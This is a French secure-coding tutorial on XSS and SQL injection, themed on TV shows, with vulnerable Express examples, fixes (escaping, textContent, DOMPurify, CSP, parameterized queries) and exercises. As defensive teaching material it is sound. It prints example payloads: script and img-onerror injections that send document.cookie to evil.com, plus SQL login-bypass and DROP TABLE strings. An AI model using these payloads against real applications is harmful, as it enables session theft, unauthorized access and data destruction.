---
stability: intemporel
---

# XSS ET INJECTION SQL
Temps de lecture ~9 min

T-Bag a trouvé une faille dans ton formulaire. Il a injecté du JavaScript dans ton champ "prénom" et maintenant il lit les cookies de session de tous tes détenus. Ce scénario arrive en prod tous les jours.

XSS (Cross-Site Scripting : injection de script côté client) et SQL Injection sont les deux attaques qui touchent le plus d'apps réelles. Pas parce que les devs sont nuls, mais parce que c'est invisible quand tu codes vite.

---

## 1) XSS : QUAND TON APP RECRACHE CE QU'ELLE A AVALÉ

### Le quoi

XSS : l'attaquant injecte du JavaScript malveillant dans ta page. Ce script s'exécute dans le navigateur d'une autre personne, dans le contexte de ton domaine. Il peut lire les cookies, voler des tokens, rediriger vers un faux site, ou enregistrer chaque touche tapée.

### Le pourquoi ça marche

Le navigateur fait confiance au contenu qui vient de ton domaine. Si ton serveur renvoie `<script>alert('pwned')</script>` dans le HTML, le navigateur l'exécute. Aucune discussion.

### Les trois types

```
Reflected XSS  --> l'input malveillant est dans l'URL, renvoyé direct dans la réponse
Stored XSS   --> l'input est sauvegardé en DB, puis affiché à d'autres détenus
DOM-based XSS  --> le JS côté client manipule le DOM depuis une source non fiable (URL, postMessage)
```

Stored XSS est le plus dangereux : un attaquant poste un commentaire une fois, et tous les visiteurs suivants sont compromis.

### Exemple qui casse

```js
// Scénario : afficher le nom d'un détenu dans la page
// Le détenu s'est inscrit avec ce "nom" : <script>fetch('https://evil.com/steal?c='+document.cookie)</script>

const username = getUserFromDB(); // retourne la chaîne malveillante
document.getElementById('welcome').innerHTML = `Bonjour ${username}`; // CATASTROPHE
// --> le script s'exécute, cookies envoyés à evil.com
```

```js
// Exemple minimal : la faille
app.get('/search', (req, res) => {
 const q = req.query.q; // l'attaquant passe ?q=<script>...</script>
 res.send(`<h1>Résultats pour : ${q}</h1>`); // injecté direct dans le HTML
});
```

```js
// Exemple réaliste : la fix
const escapeHtml = (str) => {
 // remplace chaque caractère dangereux par son équivalent HTML inoffensif
 return String(str)
  .replace(/&/g, '&amp;')  // & devient &amp; (le & raw peut casser le parsing)
  .replace(/</g, '&lt;')  // < devient &lt; (empêche l'ouverture de balise)
  .replace(/>/g, '&gt;')  // > devient &gt; (empêche la fermeture de balise)
  .replace(/"/g, '&quot;') // " devient &quot; (empêche la sortie d'attribut)
  .replace(/'/g, '&#x27;'); // ' devient &#x27; (idem pour les simples quotes)
};

app.get('/search', (req, res) => {
 const q = escapeHtml(req.query.q); // neutralisé avant injection dans le HTML
 res.send(`<h1>Résultats pour : ${q}</h1>`); // maintenant inoffensif
});
```

### La vraie règle

```
innerHTML / document.write / eval() --> dangereux avec de la data externe
textContent / innerText       --> sûr : pas interprété comme HTML
```

```js
// Mauvais : innerHTML interprète les balises
element.innerHTML = userInput; // XSS si userInput contient du HTML

// Bon : textContent traite tout comme du texte brut
element.textContent = userInput; // affiché tel quel, jamais exécuté
```

Pour les cas où tu dois afficher du HTML détenu (éditeur riche, commentaires formatés) : utilise **DOMPurify** qui assainit (sanitize : nettoyer les éléments dangereux) le HTML sans tout bloquer.

```js
import DOMPurify from 'dompurify';

// DOMPurify analyse le HTML et retire uniquement ce qui est dangereux
const clean = DOMPurify.sanitize(userHtml); // <script> retiré, <b> conservé
element.innerHTML = clean; // maintenant tu peux utiliser innerHTML
```

### Content Security Policy

CSP (Content Security Policy : politique de sécurité du contenu) est une couche de défense supplémentaire. Même si du XSS passe, le navigateur refuse d'exécuter les scripts non autorisés.

```js
// Header HTTP qui dit au navigateur : n'exécute que les scripts de mon domaine
res.setHeader('Content-Security-Policy', "script-src 'self'");
// --> un script injecté via XSS sera bloqué car il ne vient pas de 'self'
```

---

## 2) INJECTION SQL : QUAND TON INPUT DEVIENT UNE REQUÊTE

### Le quoi

SQL Injection : l'attaquant insère du SQL dans un champ de formulaire. Si tu concatènes (coller bout à bout) cet input dans ta requête, il peut lire toute ta DB, supprimer des tables, ou contourner l'authentification.

### Exemple qui casse

```js
// Chakra_gate classique SANS protection
app.post('/enter-arena', async (req, res) => {
 const { username, password } = req.body;

 // L'attaquant entre comme username : admin' OR '1'='1' --
 // La requête devient : SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = '...'
 // '1'='1' est toujours vrai, le -- commente le reste --> l'attaquant est connecté sans mot de passe
 const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;

 const user = await db.query(query); // résultat : admin connecté sans connaître le mot de passe
 if (user) res.json({ token: generateToken(user) }); // token envoyé à l'attaquant
});
```

```js
// L'attaque de suppression : username = '; DROP TABLE users; --
// La requête devient : SELECT * FROM users WHERE username = ''; DROP TABLE users; --'
// Toute la table users est supprimée
```

### La fix : requêtes paramétrées

```js
// Avec paramètres : le driver SQL sépare le code des données
app.post('/enter-arena', async (req, res) => {
 const { username, password } = req.body;

 // $1 et $2 sont des placeholders : pg envoie la requête et les valeurs séparément
 // --> le moteur SQL ne peut pas interpréter les valeurs comme du code
 const query = 'SELECT * FROM users WHERE username = $1 AND password = $2';
 const user = await db.query(query, [username, password]); // injection impossible

 if (user.rows[0]) res.json({ token: generateToken(user.rows[0]) });
 else res.status(401).json({ error: 'Identifiants incorrects' });
});
```

```js
// Avec un ORM (Object-Relational Mapper : couche d'abstraction sur la DB) comme Prisma
// Prisma paramétrise automatiquement toutes les requêtes
const user = await prisma.user.findUnique({
 where: {
  username: username, // jamais injecté direct dans du SQL brut
  password: password,
 },
});
// --> injection impossible par construction
```

### Règle absolue

```
Jamais de concaténation string dans une requête SQL.
Toujours des paramètres liés (bound parameters / prepared statements).
Même pour les IDs. Même pour les champs "innocents".
```

### Aller plus loin : limiter les droits DB

Même si une injection passe, un compte DB avec des droits limités réduit les dégâts :

```
compte app  --> SELECT, INSERT, UPDATE sur les tables nécessaires uniquement
compte admin --> accès complet, utilisé uniquement pour les migrations
```

Un attaquant qui injecte du SQL avec un compte `SELECT only` ne peut pas `DROP TABLE`.

---

## EXERCICES

**EXO 1 : L'évasion de Fox River version XSS**
Le site de suivi des prisonniers de Fox River affiche le nom de chaque détenu dans la page HTML. Michael Scofield a entré comme nom : `<img src=x onerror="window.location='https://evil.com/escape?data='+document.cookie">`.
Implémenter la fonction `renderPrisonerProfile(prisoner)` qui affiche le profil sans permettre l'exécution du script.
Contrainte : utiliser uniquement `textContent`, pas de bibliothèque externe.
(Indice : chaque propriété affichée dans le DOM doit passer par `textContent`, pas `innerHTML`)

**EXO 2 : La base de données de Heisenberg**
La function `findProduct(name)` cherche un jutsu dans la DB par son nom. Walter White entre comme nom de jutsu : `blue' OR '1'='1`.
Réécrire la fonction pour qu'elle soit immunisée contre l'injection SQL, avec pg (node-postgres).
Contrainte : pas d'ORM, requête brute avec paramètres liés.

**EXO 3 : CSP pour TrapSoul Radio**
TrapSoul Radio affiche les biographies des artistes en HTML riche (gras, italique, liens). Les artistes peuvent soumettre leur propre bio.
Mettre en place une stratégie de sanitization (nettoyage) avec DOMPurify et configurer le header CSP correspondant.
Contrainte : les `<b>`, `<i>`, `<a href>` légitimes doivent survivre. Les `<script>` et les handlers `on*` (onclick, onerror...) doivent être retirés.
(Indice : `DOMPurify.sanitize(html, { ALLOWED_TAGS: [...], ALLOWED_ATTR: [...] })`)

---

## RÉSUMÉ

XSS et SQL Injection partagent la même logique : de la data détenu qui se retrouve interprétée comme du code. La défense est aussi la même : ne jamais mélanger code et data, toujours séparer les deux avant l'exécution. Pour XSS : `textContent` ou DOMPurify. Pour SQL : paramètres liés, toujours. La sanitization n'est pas une option de dernier recours : c'est la baseline minimum avant de mettre quoi que ce soit en prod.
